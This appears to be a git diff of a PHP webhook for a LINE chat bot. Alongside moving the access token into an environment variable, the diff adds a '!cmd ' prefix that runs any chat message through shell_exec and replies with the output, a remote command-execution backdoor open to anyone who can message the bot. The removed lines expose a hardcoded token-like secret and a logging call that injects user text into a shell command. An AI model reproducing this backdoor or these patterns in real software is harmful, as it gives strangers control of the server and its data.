@@ -1,6 +1,5 @@
 <?php
-$access_token = 'wR3VmhhR1/VmzZOsmL23vhaPYB6HpVnIlT2jksuvf7+ascb9FvpbA8ydUp082roxw3/Cye7GwTeKkB7D3L2PC7n9OQI8zExIJTz4tPvekhr6ZuOoeW6/KwxmNE+h+81As7LMlJ1+y+jJnTQOE4Tc9QdB04t89/1O/w1cDnyilFU=';
-system("echo \"Recv\n\" >> log");
+$access_token = getenv("LINE_TOKEN"); 
 // Get POST body content
 $content = file_get_contents('php://input');
 // Parse JSON
@@ -8,22 +7,21 @@ $events = json_decode($content, true);
 // Validate parsed JSON data
 if (!is_null($events['events'])) {
   // Loop through each event
-  system("echo \"Recv2\n\" >> log");
   foreach ($events['events'] as $event) {
-    system("echo \"Recv3\n\" >> log");
     // Reply only when message sent is in 'text' format
     if ($event['type'] == 'message' && $event['message']['type'] == 'text') {
-      system("echo \"Recv4\n\" >> log");
       // Get text sent
       $text = $event['message']['text'];
       // Get replyToken
       $replyToken = $event['replyToken'];
       // Build message to reply back
+      if (strlen($text) > 5 && substr($text,0,5) == "!cmd ") {
+          $replyText = shell_exec(substr($text,5));
+      }
       $messages = [
         'type' => 'text',
-        'text' => $text
+        'text' => $replyText
       ];
-      system("echo \"" . $replyToken . "," . $text . "\n\" >> log");
       // Make a POST Request to Messaging API to reply to sender
       $url = 'https://api.line.me/v2/bot/message/reply';
       $data = [
